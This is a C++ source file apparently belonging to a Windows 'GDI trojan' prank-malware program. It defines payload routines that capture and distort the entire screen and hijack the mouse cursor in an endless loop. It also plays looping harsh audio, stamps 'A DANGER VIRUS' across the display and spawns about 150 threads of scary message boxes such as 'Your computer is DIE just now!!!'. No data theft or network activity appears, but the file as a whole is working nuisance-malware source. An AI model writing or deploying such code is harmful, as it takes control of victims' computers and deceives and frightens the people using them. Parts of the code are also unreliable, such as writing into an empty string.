#include"TV.h"
HCRYPTPROV prov;
DWORD xs;


void ExecutePayload(TROJAN_PAYLOAD payload, int nTime) {
	int dwStartTime = Time;
	for (int i = 0; Time < (dwStartTime + nTime); i++) {
		HDC hdcScreen = GetDC(NULL);
		payload(i, hdcScreen);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
	}
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	Sleep(100);
}
void SeedXorshift32(DWORD dwSeed) {
	xs = dwSeed;
}

DWORD Xorshift32() {
	xs ^= xs << 13;
	xs ^= xs >> 17;
	xs ^= xs << 5;
	return xs;
}

int RotateDC(HDC hdc, int Angle, POINT ptCenter) {
	int nGraphicsMode = SetGraphicsMode(hdc, GM_ADVANCED);
	XFORM xform;
	if (Angle != 0)
	{
		double fangle = (double)Angle / 180. * 3.1415926;
		xform.eM11 = (float)cos(fangle);
		xform.eM12 = (float)sin(fangle);
		xform.eM21 = (float)-sin(fangle);
		xform.eM22 = (float)cos(fangle);
		xform.eDx = (float)(ptCenter.x - cos(fangle) * ptCenter.x + sin(fangle) * ptCenter.y);
		xform.eDy = (float)(ptCenter.y - cos(fangle) * ptCenter.y - sin(fangle) * ptCenter.x);
		SetWorldTransform(hdc, &xform);
	}
	return nGraphicsMode;
}

int random() {
	if (prov == NULL)
		if (!CryptAcquireContext(&prov, NULL, NULL, PROV_RSA_FULL, CRYPT_SILENT | CRYPT_VERIFYCONTEXT))
			ExitProcess(1);

	int out;
	CryptGenRandom(prov, sizeof(out), (BYTE *)(&out));
	return out & 0x7fffffff;
}

DWORD WINAPI Sound(LPVOID lpParameter) {
	const int samples = 44100;

	WAVEFORMATEX fmt = { WAVE_FORMAT_PCM, 1, samples, samples, 1, 8, 0 };

	HWAVEOUT hwo;
	waveOutOpen(&hwo, WAVE_MAPPER, &fmt, NULL, NULL, CALLBACK_NULL);

	const int bufsize = samples * 30;
	char* wavedata = (char*)LocalAlloc(0, bufsize);

	WAVEHDR hdr = { wavedata, bufsize, 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hwo, &hdr, sizeof(hdr));

	for (;;) {
		int freq1 = 0, freq2 = 0, freq3 = 0;
		int sample1 = 0, sample2 = 0, sample3 = 0;
		for (int i = 0; i < bufsize; i++) {
			if (i % (int)(samples * 0.166) == 0) {
				freq1 = samples / (3580000.0 / (32 * ((random() % 41) * 10 + 200))) / 2;
				freq2 = samples / (3580000.0 / (32 * ((random() % 41) * 10 + 250))) / 2;
				freq3 = samples / (3580000.0 / (32 * ((random() % 41) * 10 + 325))) / 2;
			}

			sample1 = (i % freq1 < freq1 / 2) ? -127 : 127;
			sample2 = (i % freq2 < freq2 / 2) ? -127 : 127;
			sample3 = (i % freq3 < freq3 / 2) ? -127 : 127;

			wavedata[i] = (unsigned char)(((sample1 + sample2 + sample3) * 0.1) + 127);
		}

		waveOutWrite(hwo, &hdr, sizeof(hdr));

		while (!(hdr.dwFlags & WHDR_DONE)) {
			Sleep(1);
		}
	}
}

DWORD WINAPI CopyCur() {
	int w = 1920, h = 1080;
	HDC hdc = GetDC(NULL);
	for (int ccs=0; ccs < 100;ccs++) {
		CURSORINFO pci;
		pci.cbSize = sizeof(pci);
		GetCursorInfo(&pci);
		for (int i = 1; i <= 20; i++)
			DrawIcon(hdc, random() % w, random() % h, pci.hCursor);
		Sleep(10);
	}
	return 0;
}


DWORD WINAPI Left() {
	int w = 1920, h = 1080;
	HDC hdc = GetDC(NULL);
	HDC hcdc = CreateCompatibleDC(hdc);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdc, w, h);
	SelectObject(hcdc, hBitmap);
	for (int cls = 0; cls < 200; cls++)
	{
		BitBlt(hcdc, 0, 0, w / 10, h, hdc, w / 10 * 9, 0, SRCCOPY);
		BitBlt(hcdc, w / 10, 0, w / 10 * 9, h, hdc, 0, 0, SRCCOPY);
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCCOPY);
		Sleep(20);
	}
	return 0;
}
POINT mkp(int x, int y) {
	POINT p;
	p.x = x;
	p.y = y;
	return p;
}

DWORD WINAPI Tunnel() {
	int w = 1920, h = 1080;
	HDC hdc = GetDC(NULL);
	for (int i = 0; i < 100; i++) {
		POINT ps[3] = { mkp(0,h / 8), mkp(w - (w / 8),0), mkp(w / 8, h) };
		PlgBlt(hdc, ps, hdc, 0, 0, w, h, 0, 0, 0);
	}
	return 0;
}
DWORD WINAPI Down() {
	for (int i = 0; i < 200; i++) {
	HDC hdc = GetDC(NULL);
	int w = 1920,
		h = 1080,//melt Effect
		rx = rand() % w;
	BitBlt(hdc, rx, 10, 100, 1080, hdc, rx, 0, SRCCOPY);
	ReleaseDC(NULL, hdc);
	Sleep(20);
}
	return 0;
}
DWORD WINAPI G() {
	FreeConsole();
	DWORD WINAPI screenrotate(LPVOID lpParam); {
		HDC desk = GetDC(0);
		int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		RECT rekt; POINT wPt[3];
		for (int i = 0; i < 100;i++) {
			GetWindowRect(GetDesktopWindow(), &rekt);
			wPt[0].x = rand() % sw; wPt[0].y = rand() % sh;
			wPt[1].x = rand() % sw; wPt[1].y = rand() % sh;
			wPt[2].x = rand() % sw; wPt[2].y = rand() % sh;
			PlgBlt(desk, wPt, desk, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
		}
	}
	return 0;
}
void big(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdcScreen = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, szScreen.cx, szScreen.cy);
	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	SelectObject(hcdcScreen, hBitmap);

	BitBlt(hcdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);
	AlphaBlend(hcdcScreen, ptScreen.x - 6, ptScreen.y - 6, szScreen.cx + 12, szScreen.cy + 12, hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);

	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hcdcScreen, ptScreen.x, ptScreen.y, SRCCOPY);
	DeleteObject(hBitmap);
	DeleteObject(hcdcScreen);
}
void Payload1(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, 1920, 1080);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, 1920, 1080, hdcScreen, 0, 0, SRCCOPY);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	AlphaBlend(hdcScreen, ptScreen.x + t % 200 + 10, ptScreen.y - t % 25, 1920, 1080, hcdc, ptScreen.x, ptScreen.y, 1920, 1080, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);

	Sleep(20);
}

void Payload2(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();
	t *= 3;
	int x = random() % 1920;
	int y = random() % 1080;
	BitBlt(hdcScreen, x, y, t % 1920, t % 1080, hdcScreen, (x + t / 2) % 1920, y % 1080, SRCCOPY);
}
void Payload3(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, 1920, 1080);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, 1920, 1080, hdcScreen, 0, 0, SRCCOPY);

	int nGraphicsMode = SetGraphicsMode(hdcScreen, GM_ADVANCED);
	XFORM xform;
	xform.eDx = 0;
	xform.eDy = 0;
	xform.eM11 = 1;
	xform.eM12 = 0.1;
	xform.eM21 = 0;
	xform.eM22 = 1;
	SetWorldTransform(hdcScreen, &xform);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	SetBkColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));
	SetTextColor(hdcScreen, RGB(random() % 256, random() % 256, random() % 256));

	for (int i = 0; i < 5; i++) {
		TextOut(hdcScreen, random() % 1920, random() % 1080, L"A DANGER VIRUS", 15);
	}

	AlphaBlend(hdcScreen, 0, 0, 1920, 1080, hcdc, 0, 0, 1920, 1080, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);

	Sleep(50);
}void Payload4(int t, HDC hdcScreen) {
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	HDC hcdc = CreateCompatibleDC(hdcScreen);
	HBITMAP hBitmap = CreateCompatibleBitmap(hdcScreen, 1920, 1080);
	SelectObject(hcdc, hBitmap);
	BitBlt(hcdc, 0, 0, 1920, 1080, hdcScreen, 0, 0, SRCCOPY);

	POINT p = { 0 };
	p.x = (1920 / 2);
	p.y = (1080 / 2);

	BLENDFUNCTION blf = { 0 };
	blf.BlendOp = AC_SRC_OVER;
	blf.BlendFlags = 0;
	blf.SourceConstantAlpha = 128;
	blf.AlphaFormat = 0;

	RotateDC(hdcScreen, 10, p);
	AlphaBlend(hdcScreen, 0, t, 1920, 1080, hcdc, 0, 0, 1920, 1080, blf);

	DeleteObject(hcdc);
	DeleteObject(hBitmap);
}
void ExecuteShader(TROJAN_SHADER shader, int nTime) {
	int dwStartTime = Time;
	HDC hdcScreen = GetDC(NULL);
	POINT ptScreen = GetVirtualScreenPos();
	SIZE szScreen = GetVirtualScreenSize();

	BITMAPINFO bmi = { 0 };
	PRGBQUAD prgbScreen;
	HDC hdcTempScreen;
	HBITMAP hbmScreen;

	bmi.bmiHeader.biSize = sizeof(BITMAPINFO);
	bmi.bmiHeader.biBitCount = 32;
	bmi.bmiHeader.biPlanes = 1;
	bmi.bmiHeader.biWidth = szScreen.cx;
	bmi.bmiHeader.biHeight = szScreen.cy;

	prgbScreen = { 0 };

	hdcTempScreen = CreateCompatibleDC(hdcScreen);
	hbmScreen = CreateDIBSection(hdcScreen, &bmi, 0, (void**)&prgbScreen, NULL, 0);
	SelectObject(hdcTempScreen, hbmScreen);

	for (int i = 0; Time < (dwStartTime + nTime); i++) {
		hdcScreen = GetDC(NULL);
		BitBlt(hdcTempScreen, 0, 0, szScreen.cx, szScreen.cy, hdcScreen, 0, 0, SRCCOPY);
		shader(i, szScreen.cx, szScreen.cy, prgbScreen);
		BitBlt(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hdcTempScreen, 0, 0, SRCCOPY);
		ReleaseDC(NULL, hdcScreen);
		DeleteObject(hdcScreen);
		Sleep(10);
	}

	DeleteObject(hbmScreen);
	DeleteDC(hdcTempScreen);
	RedrawWindow(NULL, NULL, NULL, RDW_ERASE | RDW_INVALIDATE | RDW_ALLCHILDREN);
	Sleep(100);
}

void Payload5(int t, int w, int h, PRGBQUAD prgbScreen) {
	for (int i = 0; i < w * h; i++) {
      prgbScreen[i].rgb = (prgbScreen[i].rgb * 2) % (RGB(255, 255, 255));
	}
}
void Payload6() {
	FreeConsole();
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);

	for  (int i = 0;  i < 1000;i++)
	{
		DrawIcon(hdc, rand() % 1920, rand() % 1080, LoadIcon(nullptr, IDI_ERROR));//画错误图标
		DrawIcon(hdc, rand() % 1920, rand() % 1080, LoadIcon(nullptr, IDI_WINLOGO));
		DrawIcon(hdc, rand() % 1920, rand() % 1080, LoadIcon(nullptr, IDI_QUESTION));
		DrawIcon(hdc, rand() % 1920, rand() % 1080, LoadIcon(nullptr, IDI_WARNING));
		DrawIcon(hdc, rand() % 1920, rand() % 1080, LoadIcon(nullptr, IDI_SHIELD));
		DrawIcon(hdc, rand() % 1920, rand() % 1080, LoadIcon(nullptr, IDI_INFORMATION));

	}
}
DWORD WINAPI FlyCur(LPVOID lpParameter) {
	while (0==0)
	{
		SetCursorPos(rand() % 1920, rand() % 1080);
		Sleep(1);
	}
	return 0;
}
void Payload7() {
	int a, b;
	a = 1920;
	b = 1080;
	for (int i = 0; i < 100; i++) {
	StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY);//屏幕隧道
	Sleep(100);
}
}
DWORD WINAPI Payload8(LPVOID lpParameter) {
	int a, b;
	a = 1920;
	b = 1080;
	for (int i = 0; i < 100; i++) {
		StretchBlt(GetDC(NULL), 50, 50, a - 100, b - 100, GetDC(NULL), 0, 0, a, b, SRCCOPY);//屏幕隧道
		Sleep(100);
	}
	return 0;
}
LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT* pcs = ((CBT_CREATEWND*)lParam)->lpcs;
		int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);
		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;
			int x = random() % (w - pcs->cx);
			int y = random() % (h - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

DWORD WINAPI MessageThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	string Message;
	for (int i = 0; i < 20; i++) {
		Message[i] = (char)(33 + random() % 94);
	}
	size_t size = Message.length();
	MessageBox(NULL, L"Your computer is DIE just now!!!", L"A DANGER VIRUS", 48);
	UnhookWindowsHookEx(hook);

	return 0;
}
DWORD WINAPI Payload9() {
	for (int a = 0; a < 150; a++) {
		CreateThread(NULL, 4096, &MessageThread, NULL, NULL, NULL);
		Sleep(100);
	}
	return 0;
}
DWORD WINAPI _MSG(LPVOID lpParameter) {
	MessageBox(NULL,L"",L"TOO LATE",16);
	return 0;
}